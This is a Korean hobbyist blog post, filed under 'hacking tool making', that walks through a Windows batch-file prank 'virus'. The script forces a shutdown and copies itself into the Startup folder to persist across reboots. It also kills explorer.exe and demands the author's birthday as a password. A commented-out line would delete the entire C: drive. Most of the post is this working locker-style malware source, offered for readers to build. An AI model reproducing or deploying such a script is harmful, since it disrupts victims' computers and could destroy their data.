---
{"title":"메모장을 이용한 간단한 바이러스 실습","date":"2026-11-11","category":"writing","tags":[],"summary":"배치 파일 실습","section":["해킹툴제작"]}
---


# [ 해킹툴 제작 ] 메모장을 이용한 간단한 바이러스 실습

본 포스팅에서 다루는 시뮬레이션 프로그램은 **실제 시스템에 영구적인 손상을 주지 않도록 설계**되었습니다. (가짜 바이러스 시나리오)

때는 바야흐로 중학생 때 한참 해킹에 관심을 가지고 열정을 쏟고 있었을 때 고작 "-메-"로도 해킹이 가능하다는 사실을 입수했었다.

그 뒤로 cmd 명령어를 하나하나 쳐보면서 만들어 냈던 바이러스인데 아무래도 요즘은 보안이 발전해서 장난 느낌으로 만들어 보았다.

 사실 이번에 효과음도 넣고 echo로 겉멋 좀 부리려고 공을 들였지 실속 있는 바이러스를 만드려면 그냥 레지스터리 편집하고 C드라이브 날리면 그만이긴 하다..

우선 바이러스의 효능(?)은 필자의 생일을 비밀번호를 입력해야하고 틀릴 경우에 강제 종료되고 이미 프로그램은 시작프로그램에 넣어놓기 때문에 재시작하더라도 바이러스 무한 LOOP에 걸리게 된다. (주석으로 C드라이브 날리는거 적어는 놓았는데 너무 위험함)

```bash
powershell -c "[console]::beep(1000, 300)"
```

이 명령어로 효과음을 낼 수 있었는데 이건 나도 처음 알아서 좀 신기방기

그럼 거두절미 하고 코드를 봐보자.

```bash
@echo off

color 0a
title KickTheBall Virus

echo.
echo  ##########################################################
echo  #                                                        #
echo  #    K I C K T H E B A L L   V I R U S   [ v 1.0 ]       #
echo  #    -------------------------------------------------   #
echo  #    (C) 2026 KickTheBall. All Rights Reserved.          #
echo  #                                                        #
echo  ##########################################################
echo.

pause
cls

shutdown /s /t 300 /f > nul
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" > nul
taskkill /f /im explorer.exe > nul

powershell -c "[console]::beep(1000, 300)"
echo -----------------------------
echo KickTheBall Virus!
echo.
echo You infected by fatal Virus!
echo -----------------------------

pause
cls

powershell -c "[console]::beep(1000, 300)"
echo --------------------------------------------------------------------------------------------------------------------
echo If you want to get your PC back, write KickTheBall's birthday in 6 digits.
echo.
echo Otherwise, this fatal Virus will delete all your drivers.
echo.
echo If you restart your PC, the virus will restart as well.
echo --------------------------------------------------------------------------------------------------------------------

pause
cls

powershell -c "[console]::beep(1000, 300)"
echo ----------------------------------
echo Then, time to enjoy game.
echo ----------------------------------
echo.

:password
set /p password=Enter KickTheBall's birthday in 6 digits : 

if "%password%"=="020503" (
	goto success
)	else (
	goto fail
)

:success
color 1f
shutdown /a
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"
start explorer.exe
cls
powershell -c "[console]::beep(1000, 300)"
echo ======================
echo [ SUCCESS ] SYSTEM RESTORED
echo ======================
pause
exit

:fail
color 4f
shutdown /a
shutdown /s /t 5
::rd /s /q c:\
cls
powershell -c "[console]::beep(1000, 300)"
echo ======================
echo [ FAIL ] SYSTEM DESTROY
echo ======================
pause
```

뭐 대충 이런식으로 나온다.

batch 파일로도 충분히 if문과 def문의 역할을 수행할 수 있고 오히려 OS에 접근하기 편하기 때문에 바이러스 만들 때 더 수월했던 것 같다.

마지막으로 비밀번호를 올바르게 쳤을 때 영상만 올림으로 끝~

[

KickTheBall Virus.mp4

0.21MB

](https://blog.kakaocdn.net/dna/mMuoK/dJMcagEMS27/AAAAAAAAAAAAAAAAAAAAAJgHZHVpjH0s1tkLWmLJR1QAEWl5mQgM5Iz6fYmq_SCT/KickTheBall%20Virus.mp4?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1796050799&allow_ip=&allow_referer=&signature=KPVpTfZr4vvrw2Q9aRe1gIz5INs%3D&attach=1&knm=tfile.mp4)
